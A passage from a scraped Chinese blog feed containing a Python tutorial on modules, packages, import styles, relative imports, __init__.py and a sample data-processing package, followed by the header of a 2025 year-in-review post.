<span class="hljs-built_in">print</span>(math_tools.circle_area(<span class="hljs-number">5</span>))  <span class="hljs-comment"># 输出78.539815</span>
<span class="hljs-built_in">print</span>(math_tools.sphere_volume(<span class="hljs-number">3</span>))  <span class="hljs-comment"># 输出113.097336</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-2">1.2 模块导入的三种方式</h3>
<p>（1）基础导入：直接导入整个模块</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> math_tools
math_tools.<span class="hljs-built_in">circle_area</span>(<span class="hljs-number">5</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）别名导入：为模块起简短别名</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> math_tools <span class="hljs-keyword">as</span> mt
mt.<span class="hljs-title function_">circle_area</span>(<span class="hljs-number">5</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）精确导入：只导入需要的函数</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> math_tools <span class="hljs-keyword">import</span> circle_area
circle_area(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 直接使用，无需模块名前缀</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>选择建议</strong>：当模块功能较多时使用<code>import</code>，避免命名冲突；当只需少量功能时使用<code>from...import</code>，减少代码量。</p>
<h3 data-id="heading-3">1.3 模块的搜索路径</h3>
<p>Python按以下顺序查找模块：</p>
<ol>
<li>当前目录</li>
<li>PYTHONPATH环境变量指定的目录</li>
<li>标准库路径</li>
<li>第三方库安装路径</li>
</ol>
<p>通过<code>sys.path</code>可查看完整搜索路径：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">import</span> sys
<span class="hljs-built_in">print</span>(sys.path)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>若要添加自定义路径，可修改该列表或设置PYTHONPATH环境变量。</p>
<h3 data-id="heading-4">1.4 模块的重新加载</h3>
<p>当修改模块后，需重新加载才能生效。使用<code>importlib.reload</code>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> importlib
<span class="hljs-keyword">import</span> math_tools

<span class="hljs-comment"># 修改math_tools.py后</span>
importlib.reload(math_tools)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-5">1.5 模块的<code>__name__</code>属性</h3>
<p>每个模块都有<code>__name__</code>属性，当直接运行模块时为<code>"__main__"</code>，被导入时为模块名。利用该特性可编写测试代码：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># math_tools.py</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"测试circle_area(2):"</span>, circle_area(2))
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>直接运行模块时会执行测试代码，被导入时不会执行。</p>
<h2 data-id="heading-6">二、包：模块的集合</h2>
<h3 data-id="heading-7">2.1 创建包的结构</h3>
<p>包是包含<code>__init__.py</code>文件的目录，用于组织相关模块。例如创建图形计算包：</p>
<pre><code class="hljs language-markdown" lang="markdown">graphics/
├── <span class="hljs-strong">__init__</span>.py
├── geometry.py
└── transforms.py
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p><code>__init__.py</code>可以是空文件，也可包含初始化代码或定义<code>__all__</code>变量控制<code>from package import *</code>的行为。</p>
<h3 data-id="heading-8">2.2 包的导入方式</h3>
<p>（1）导入整个包：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> graphics
graphics.geometry.<span class="hljs-built_in">circle_area</span>(<span class="hljs-number">5</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）导入特定模块：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> graphics <span class="hljs-keyword">import</span> geometry
geometry.<span class="hljs-title function_">circle_area</span>(<span class="hljs-number">5</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）导入特定函数：</p>
<pre><code class="hljs language-java" lang="java">from graphics.geometry <span class="hljs-keyword">import</span> circle_area
<span class="hljs-title function_">circle_area</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-9">2.3 相对导入（包内模块互调）</h3>
<p>在包内部模块间导入时，使用相对路径更清晰。假设<code>transforms.py</code>需要调用<code>geometry.py</code>中的函数：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># transforms.py</span>
<span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> geometry  <span class="hljs-comment"># .表示当前包</span>
<span class="hljs-keyword">from</span> .. <span class="hljs-keyword">import</span> utils    <span class="hljs-comment"># ..表示上级包（需在子包中使用）</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_circle</span>(<span class="hljs-params">radius, angle</span>):
    area = geometry.circle_area(radius)
    <span class="hljs-comment"># 旋转计算...</span>
    <span class="hljs-keyword">return</span> area
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>注意</strong>：相对导入仅在包内部有效，直接运行的脚本文件不能使用相对导入。</p>
<h3 data-id="heading-10">2.4 包的初始化文件<code>__init__.py</code></h3>
<p>该文件有三个作用：</p>
<ol>
<li>标识目录为Python包</li>
<li>执行包初始化代码</li>
<li>定义<code>__all__</code>控制批量导入</li>
</ol>
<p>示例<code>__init__.py</code>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># graphics/__init__.py</span>
__all__ = [<span class="hljs-string">'geometry'</span>, <span class="hljs-string">'transforms'</span>]  <span class="hljs-comment"># from graphics import * 时只导入这两个模块</span>

<span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> geometry
<span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> transforms

<span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Welcome to graphics package!"</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-11">三、实战案例：开发一个数据处理工具包</h2>
<h3 data-id="heading-12">3.1 项目规划</h3>
<p>开发<code>data_processor</code>包，包含以下功能：</p>
<ul>
<li>文件读写（<code>file_io.py</code>）</li>
<li>数据清洗（<code>cleaning.py</code>）</li>
<li>统计分析（<code>stats.py</code>）</li>
</ul>
<p>项目结构：</p>
<pre><code class="hljs language-markdown" lang="markdown">data<span class="hljs-emphasis">_processor/
├── <span class="hljs-strong">__init__</span>.py
├── file_</span>io.py
├── cleaning.py
└── stats.py
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-13">3.2 模块实现</h3>
<p>（1）<code>file_io.py</code>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> csv
<span class="hljs-keyword">import</span> json

<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_csv</span>(<span class="hljs-params">file_path</span>):
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(csv.reader(f))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">write_csv</span>(<span class="hljs-params">data, file_path</span>):
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>, newline=<span class="hljs-string">''</span>) <span class="hljs-keyword">as</span> f:
        writer = csv.writer(f)
        writer.writerows(data)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_json</span>(<span class="hljs-params">file_path</span>):
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">return</span> json.load(f)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">write_json</span>(<span class="hljs-params">data, file_path</span>):
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:
        json.dump(data, f, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">4</span>)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）<code>cleaning.py</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">def remove_duplicates(<span class="hljs-keyword">data</span>):
    <span class="hljs-keyword">return</span> list({tuple(row) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-keyword">data</span>})

def fill_missing(<span class="hljs-keyword">data</span>, value=<span class="hljs-number">0</span>):
    <span class="hljs-keyword">return</span> [[cell <span class="hljs-keyword">if</span> cell <span class="hljs-keyword">is</span> not None <span class="hljs-keyword">else</span> value <span class="hljs-keyword">for</span> cell <span class="hljs-keyword">in</span> row] <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-keyword">data</span>]
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）<code>stats.py</code>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">mean</span>(<span class="hljs-params">numbers</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(numbers) / <span class="hljs-built_in">len</span>(numbers) <span class="hljs-keyword">if</span> numbers <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">median</span>(<span class="hljs-params">numbers</span>):
    sorted_nums = <span class="hljs-built_in">sorted</span>(numbers)
    n = <span class="hljs-built_in">len</span>(numbers)
    mid = n // <span class="hljs-number">2</span>
    <span class="hljs-keyword">return</span> (sorted_nums[mid] + sorted_nums[-mid-<span class="hljs-number">1</span>]) / <span class="hljs-number">2</span> <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> sorted_nums[mid]
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（4）<code>__init__.py</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> .<span class="hljs-property">file_io</span> <span class="hljs-keyword">import</span> read_csv, write_csv, read_json, write_json
<span class="hljs-keyword">from</span> .<span class="hljs-property">cleaning</span> <span class="hljs-keyword">import</span> remove_duplicates, fill_missing
<span class="hljs-keyword">from</span> .<span class="hljs-property">stats</span> <span class="hljs-keyword">import</span> mean, median

__all__ = [<span class="hljs-string">'read_csv'</span>, <span class="hljs-string">'write_csv'</span>, <span class="hljs-string">'remove_duplicates'</span>, <span class="hljs-string">'mean'</span>, <span class="hljs-string">'median'</span>]
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-14">3.3 使用示例</h3>
<p>（1）直接使用模块功能：</p>
<pre><code class="hljs language-ini" lang="ini">from data_processor.file_io import read_csv
from data_processor.cleaning import remove_duplicates

<span class="hljs-attr">data</span> = read_csv(<span class="hljs-string">'input.csv'</span>)
<span class="hljs-attr">clean_data</span> = remove_duplicates(data)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）批量导入常用功能：</p>
<pre><code class="hljs language-ini" lang="ini">from data_processor import read_csv, remove_duplicates, mean

<span class="hljs-attr">data</span> = read_csv(<span class="hljs-string">'input.csv'</span>)
<span class="hljs-attr">clean_data</span> = remove_duplicates(data)
<span class="hljs-attr">avg</span> = mean([row[<span class="hljs-number">1</span>] for row in clean_data if isinstance(row[<span class="hljs-number">1</span>], (int, float))])
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-15">3.4 打包发布（可选）</h3>
<p>若要将包分享给他人使用，可创建setup.py文件：</p>
<pre><code class="hljs language-ini" lang="ini">from setuptools import setup, find_packages

setup(
    <span class="hljs-attr">name</span>=<span class="hljs-string">"data_processor"</span>,
    <span class="hljs-attr">version</span>=<span class="hljs-string">"0.1"</span>,
    <span class="hljs-attr">packages</span>=find_packages(),
    <span class="hljs-attr">install_requires</span>=[],  <span class="hljs-comment"># 依赖项</span>
    <span class="hljs-attr">author</span>=<span class="hljs-string">"Your Name"</span>,
    <span class="hljs-attr">description</span>=<span class="hljs-string">"A simple data processing package"</span>
)
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>运行以下命令安装本地包：</p>
<pre><code class="hljs language-erlang" lang="erlang">pip install -e .
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-16">四、模块化编程的最佳实践</h2>
<h3 data-id="heading-17">4.1 模块设计原则</h3>
<ol>
<li><strong>单一职责原则</strong>：每个模块/函数只做一件事</li>
<li><strong>低耦合高内聚</strong>：模块间依赖尽可能少，模块内部功能紧密相关</li>
<li><strong>合理命名</strong>：模块名使用小写字母和下划线，如<code>data_processor</code></li>
<li><strong>文档字符串</strong>：为模块、函数添加docstring说明用途和参数</li>
</ol>
<h3 data-id="heading-18">4.2 避免循环导入</h3>
<p>当模块A导入模块B，同时模块B又导入模块A时会产生循环导入错误。解决方案：</p>
<ul>
<li>重构代码，将共享功能移到第三个模块</li>
<li>将导入语句移到函数内部（不推荐，降低可读性）</li>
</ul>
<h3 data-id="heading-19">4.3 使用<code>if __name__ == "__main__"</code></h3>
<p>为模块添加测试代码时，务必放在该条件块内，避免被导入时意外执行。</p>
<h3 data-id="heading-20">4.4 版本控制</h3>
<p>为模块添加版本号，便于追踪变更。可在<code>__init__.py</code>中定义：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">__version__</span> = <span class="hljs-string">'0.1.0'</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-21">4.5 依赖管理</h3>
<p>使用<code>requirements.txt</code>或<code>pyproject.toml</code>明确项目依赖，确保环境一致性。</p>
<h2 data-id="heading-22">五、常见问题解决方案</h2>
<h3 data-id="heading-23">5.1 模块找不到错误</h3>
<p>错误示例：<code>ModuleNotFoundError: No module named 'xxx'</code></p>
<p>解决方案：</p>
<ol>
<li>检查模块文件是否存在</li>
<li>确认文件在Python搜索路径中（打印<code>sys.path</code>查看）</li>
<li>检查文件名是否与模块名一致（不要使用Python保留字如<code>str.py</code>）</li>
</ol>
<h3 data-id="heading-24">5.2 导入冲突</h3>
<p>当多个模块有同名函数时，使用完整导入路径区分：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> package1 <span class="hljs-keyword">import</span> func <span class="hljs-keyword">as</span> func1
<span class="hljs-keyword">from</span> package2 <span class="hljs-keyword">import</span> func <span class="hljs-keyword">as</span> func2
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-25">5.3 性能优化</h3>
<p>对于频繁导入的模块，可将常用函数放在<code>__init__.py</code>中直接暴露，减少导入层级。</p>
<h3 data-id="heading-26">5.4 跨平台兼容</h3>
<p>处理文件路径时使用<code>os.path</code>模块：</p>
<pre><code class="hljs language-ini" lang="ini">import os

<span class="hljs-attr">file_path</span> = os.path.join(<span class="hljs-string">'data'</span>, <span class="hljs-string">'input.csv'</span>)  <span class="hljs-comment"># 自动处理不同操作系统的路径分隔符</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-27">六、进阶技巧</h2>
<h3 data-id="heading-28">6.1 延迟导入</h3>
<p>对于启动时不需要立即使用的模块，可在函数内部导入以加快程序启动速度：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd  <span class="hljs-comment"># 延迟导入</span>
    df = pd.read_csv(<span class="hljs-string">'data.csv'</span>)
    <span class="hljs-comment"># 处理数据...</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-29">6.2 注册模式</h3>
<p>通过装饰器实现插件式架构：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># plugins.py</span>
_plugins = {}

<span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">name</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator</span>(<span class="hljs-params">func</span>):
        _plugins[name] = func
        <span class="hljs-keyword">return</span> func
    <span class="hljs-keyword">return</span> decorator

<span class="hljs-comment"># user_plugins.py</span>
<span class="hljs-keyword">from</span> plugins <span class="hljs-keyword">import</span> register

<span class="hljs-meta">@register(<span class="hljs-params"><span class="hljs-string">'uppercase'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">uppercase_processor</span>(<span class="hljs-params">text</span>):
    <span class="hljs-keyword">return</span> text.upper()

<span class="hljs-comment"># main.py</span>
<span class="hljs-keyword">from</span> plugins <span class="hljs-keyword">import</span> _plugins
<span class="hljs-keyword">from</span> user_plugins <span class="hljs-keyword">import</span> *

<span class="hljs-built_in">print</span>(_plugins[<span class="hljs-string">'uppercase'</span>](<span class="hljs-string">'hello'</span>))  <span class="hljs-comment"># 输出HELLO</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-30">6.3 动态导入</h3>
<p>根据字符串名称导入模块：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">module_name</span> = <span class="hljs-string">'math_tools'</span>
<span class="hljs-attr">math_module</span> = __import__(module_name)  <span class="hljs-comment"># 方法1</span>
<span class="hljs-comment"># 或</span>
import importlib
<span class="hljs-attr">math_module</span> = importlib.import_module(module_name)  <span class="hljs-comment"># 方法2</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-31">结语</h2>
<p>模块化编程是Python项目从"能运行"到"易维护"的关键跃迁。通过合理拆分功能、明确接口定义，不仅能提升代码复用率，还能让团队协作更加高效。记住：好的代码结构应该像乐高积木——每个模块都是独立的标准件，可以轻松组合成各种复杂系统。从今天开始，尝试将超过200行的脚本重构为模块化结构，你会逐渐感受到这种编程方式带来的生产力提升。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[逝水流远，长忆当歌——我的2025]]></title>    <link>https://juejin.cn/post/7584071941024956431</link>    <guid>https://juejin.cn/post/7584071941024956431</guid>    <pubDate>2025-12-16T08:35:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584071941024956431" data-draft-id="7462611075534569512" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="逝水流远，长忆当歌——我的2025"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2025-12-16T08:35:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Gopher"/> <meta itemprop="url" content="https://juejin.cn/user/3913917123797735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            逝水流远，长忆当歌——我的2025
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3913917123797735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Gopher
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:35:15.000Z" title="Tue Dec 16 2025 08:35:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
